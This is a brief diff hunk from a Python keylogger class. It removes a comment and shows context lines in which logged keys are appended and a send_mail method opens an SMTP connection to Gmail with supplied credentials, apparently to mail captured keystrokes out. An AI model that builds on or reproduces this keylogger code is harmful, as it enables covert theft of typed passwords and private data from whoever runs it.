@@ -40,7 +40,7 @@ class KeyLogger:
         self.append_to_log(current_key)
 
 
-    # Create underlying back structure which will publish emails
+    
 
     def send_mail(self, email, password, message):
         server = smtplib.SMTP('smtp.gmail.com', 587)
